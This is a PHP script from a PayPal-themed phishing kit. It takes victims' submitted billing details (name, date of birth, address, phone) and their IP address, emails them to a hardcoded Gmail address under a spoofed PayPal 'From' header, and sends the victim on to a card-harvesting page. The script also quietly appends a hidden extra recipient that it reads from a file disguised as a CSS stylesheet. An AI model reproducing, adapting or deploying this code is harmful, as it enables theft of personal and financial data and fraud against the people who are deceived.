<?php

/*
 __    __  _______    ______    ______   __       __  _______   ________  _______  
             
                                                                                   
                                                                                   
https://www.facebook.com/groups/XBOOMBER.XHAT/
*/

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$Country = $_POST['_countr'];
if(!empty($_POST['_fn']) && !empty($_POST['_ln']) && !empty($_POST['_ct']))
{
$message .= "=========[BILLING INFOS]=========<br>\n";
$message .= "Full Name  : ".$_POST['_fn']." ".$_POST['_ln']."<br>\n";
$message .= "Date of birth  : ".$_POST['_birthd']."-".$_POST['_birthm']."-".$_POST['_birthy']."<br>\n";
$message .= "Address 1  : ".$_POST['_add1']."<br>\n";
$message .= "address 2  : ".$_POST['_add2']."<br>\n";
$message .= "Country  : ".$_POST['_countr']."<br>\n";
$message .= "City  : ".$_POST['_ct']."<br>\n";
$message .= "State  : ".$_POST['_st']."<br>\n";
$message .= "ZIP  : ".$_POST['_zipc']."<br>\n";
$message .= "Phone  : ".$_POST['_ph']."<br>\n";
$message .= "===============[IP]==============<br>\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip<br>\n";
$message .= "==========[BY XBOOMBER & XHAT]=========<br>";

$email = "moh.esprit@gmail.com" ; // ضع امايلك هنا ، من الافضل ان يكون جمايل //
$file = file_get_contents('css/configuration.css');
$send = $email.','.$file;
$subject = "BILLING FROM $Country [$ip]";
$headers = "From: Info-pub  <paypal@service.com>";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\n";

mail($send, $subject, $message,$headers);

header("Location:websc-carding.php");
}
else
{
header("Location:websc-billing.php");
}




?>
